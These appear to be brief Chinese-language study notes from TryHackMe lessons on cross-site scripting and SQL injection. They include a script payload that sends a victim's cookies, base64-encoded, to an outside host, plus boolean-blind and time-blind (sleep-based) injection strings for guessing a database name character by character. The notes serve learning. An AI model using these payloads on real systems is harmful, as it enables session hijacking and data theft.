# Cross Site Scripting

tryhackme讲到的主要的点就是尝试闭合标签或者其他符号绕过，
然后插入js恶意代码，例如：

    <script>fetch('http://hackweb.site/?cookie=' + btoa(document.cookie));</script>

fetch()用于发起http请求

btoa()用于将数据进行base64 encode



# SQL注入

tryhackme这里讲的也比较基础

有意思的点在bool盲注，页面可能只有bool值回显，并没有其他详细信息返回的时候适用

通过like构造:

    website.com/checkuser?username=-1' union select 1,2,3 where database() like 's%';%23

挨个字符挨个字符爆

### 时间盲注

跟布尔盲注非常相似，只是页面完全没有回显，这时候可以使用sleep()，如果sleep成功则可能存在sql注入

    ?referrer=adm1' union select sleep(3),2 where database() like 's%';%23
